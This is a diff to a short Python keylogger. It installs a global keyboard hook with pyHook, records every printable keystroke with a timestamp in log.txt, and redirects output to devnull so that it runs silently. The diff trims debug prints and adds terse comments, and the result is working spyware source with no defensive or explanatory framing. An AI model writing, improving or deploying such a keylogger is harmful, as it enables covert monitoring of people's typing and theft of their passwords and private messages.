@@ -9,20 +9,20 @@ import sys
 import os
 import time
 
+# hide output
 sys.stderr = sys.stdout = os.devnull
-#sys.stderr = sys.stdout
 
+# store buffer
 class Logger:
     buffer = ''
 
+# hook function
 def OnKeyboardEvent(event):
     if event.Ascii != None:
         if event.Ascii in range(32, 127):
             Logger.buffer += chr(event.Ascii)
-            #print(chr(event.Ascii))
         elif event.Ascii == 13:
             Logger.buffer += '\n'
-            #print('Logging: ' + Logger.buffer)
             f = open('log.txt', 'a')
             t = time.strftime('%Y.%d.%m.%H:%M:%S')
             f.write(t + ": " + Logger.buffer)
@@ -35,10 +35,8 @@ def OnKeyboardEvent(event):
 
         return 1
 
-# create a hook manager object
+# set hook
 hm = pyHook.HookManager()
 hm.KeyDown = OnKeyboardEvent
-# set the hook
 hm.HookKeyboard()
-# wait forever
 pythoncom.PumpMessages()
